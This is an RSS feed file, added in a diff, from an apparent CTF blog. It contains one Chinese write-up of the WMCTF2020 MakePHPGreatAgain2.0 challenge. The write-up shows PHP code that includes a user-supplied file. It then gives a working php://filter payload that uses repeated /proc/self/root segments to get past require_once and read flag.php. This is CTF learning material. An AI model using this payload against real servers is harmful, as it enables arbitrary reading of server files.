@@ -1,0 +1,141 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Hexo • Posts by &#34;require_once函数&#34; tag</title>
+        <link>http://odiws.github.io</link>
+        <description></description>
+        <language>en</language>
+        <pubDate>Fri, 06 Sep 2024 20:04:32 +0800</pubDate>
+        <lastBuildDate>Fri, 06 Sep 2024 20:04:32 +0800</lastBuildDate>
+        <category>buuctf</category>
+        <category>system_file</category>
+        <category>sql文件读取</category>
+        <category>文件内无字符rce</category>
+        <category>文件上传</category>
+        <category>php绕过open_basedir设置</category>
+        <category>无字母rce</category>
+        <category>ctf</category>
+        <category>php原生类利用</category>
+        <category>php反序列化</category>
+        <category>md5()和sha1()对类进行hash 触发__toString方法</category>
+        <category>http</category>
+        <category>cms框架</category>
+        <category>python</category>
+        <category>mongodb注入</category>
+        <category>条件竞争：利用session.upload_progress</category>
+        <category>preg_match绕过</category>
+        <category>$_server query_string 绕过</category>
+        <category>$_request绕过</category>
+        <category>file_get_cotents绕过</category>
+        <category>sha1函数比较数组绕过</category>
+        <category>create_function运用</category>
+        <category>buuctf， 反序列化</category>
+        <category>regexp注入</category>
+        <category>ECB加密</category>
+        <category>php7 segment fault特性</category>
+        <category>json数据爬虫</category>
+        <category>phar反序列化</category>
+        <category>js</category>
+        <category>CRLF Injection</category>
+        <category>soap</category>
+        <category>pickle反序列化</category>
+        <category>thinkphpV6.0.0</category>
+        <category>buuctf， 伪随机数</category>
+        <category>zip加密</category>
+        <category>xxe</category>
+        <category>xml_upload</category>
+        <category>flask的session伪造</category>
+        <category>二次渲染</category>
+        <category>buuctf，Perl后端文件上传</category>
+        <category>buuctf，xxe漏洞</category>
+        <category>java</category>
+        <category>flask</category>
+        <category>ctf工具安装教程</category>
+        <category>sql注入</category>
+        <category>php绕过open_opedir设置</category>
+        <category>TOTP</category>
+        <category>rce</category>
+        <category>ssti</category>
+        <category>insert截断</category>
+        <category>xss攻击</category>
+        <category>c的预处理</category>
+        <category>图片类</category>
+        <category>爬虫</category>
+        <category>js原型链污染</category>
+        <category>反序列化字符串逃逸</category>
+        <category>sql injection</category>
+        <category>文件上传(头像上传)</category>
+        <category>session反序列化</category>
+        <category>ssrf</category>
+        <category>HTTP走私攻击</category>
+        <category>json数据unicode转码绕过</category>
+        <category>对sqlite的sql注入</category>
+        <category>未理解</category>
+        <category>命令执行</category>
+        <category>zip软链接</category>
+        <category>python_seed函数</category>
+        <category>session伪造</category>
+        <category>js-vm沙箱逃逸</category>
+        <category>willphp2.2</category>
+        <category>ssti-smarty3.1.39</category>
+        <category>./htaccess文件上传</category>
+        <category>php未解析</category>
+        <category>利用环境变量构造bash命令</category>
+        <category>利用.htaccess构成后门</category>
+        <category>通过php_value来设置preg_macth正则回溯次数</category>
+        <category>java反序列化</category>
+        <category>伪随机数</category>
+        <category>mysql</category>
+        <category>信息搜集（js，网络）</category>
+        <category>异或</category>
+        <category>密码爆破</category>
+        <category>sqlmap使用</category>
+        <category>SQL注入</category>
+        <category>文件包含</category>
+        <category>php伪协议</category>
+        <category>pearcmd文件包含</category>
+        <category>xpath注入</category>
+        <category>Padding oracle attack 与CBC翻转字节攻击</category>
+        <category>php</category>
+        <category>sql盲注</category>
+        <category>php7.4</category>
+        <category>FFI预处理</category>
+        <category>thinkphp3.2.4</category>
+        <category>jwt</category>
+        <category>sql二次注入</category>
+        <category>MD5碰撞</category>
+        <category>jwt密码爆破</category>
+        <category>cms</category>
+        <category>create_function()函数</category>
+        <category>sqlע��</category>
+        <category>jwt身份验证</category>
+        <category>rc4</category>
+        <category>CRLF</category>
+        <category>任意文件读取</category>
+        <category>PDO堆叠注入</category>
+        <category>test</category>
+        <category>tag2</category>
+        <category>shell反弹</category>
+        <category>phpexit绕过</category>
+        <category>require_once函数</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/09/06/WMCTF2020-MakePHPGreatAgain2-0/</guid>
+            <title>[WMCTF2020]MakePHPGreatAgain2.0</title>
+            <link>http://odiws.github.io/2024/09/06/WMCTF2020-MakePHPGreatAgain2-0/</link>
+            <category>buuctf</category>
+            <category>require_once函数</category>
+            <pubDate>Fri, 06 Sep 2024 20:04:32 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;wmctf2020makephpgreatagain20&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wmctf2020makephpgreatagain20&#34;&gt;#&lt;/a&gt; [WMCTF2020]MakePHPGreatAgain2.0&lt;/h2&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;require_once&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;flag.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;require_once&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里有个 require_once () 函数需要了解一下，如果 require_once 包含过一次 flag.php 再次出现则不会执行&lt;/p&gt;
+&lt;p&gt;发现 require 文件时，在对&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTglQkQlQUYlRTklOTMlQkUlRTYlOEUlQTUmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;软链接&lt;/span&gt;的操作上存在一些缺陷，似乎并不会进行多次解析获取真实路径。&lt;/p&gt;
+&lt;p&gt;/proc/self 指向当前进程的 /proc/pid/&lt;br&gt;
+/proc/self/root/ 是指向 / 的符号链接&lt;/p&gt;
+&lt;p&gt;使用伪协议来读取 flag, 构造 payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;参考链接：&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pZ28xMzQvYXJ0aWNsZS9kZXRhaWxzLzEyNTM0MjE4Mg==&#34;&gt;https://blog.csdn.net/nigo134/article/details/125342182&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
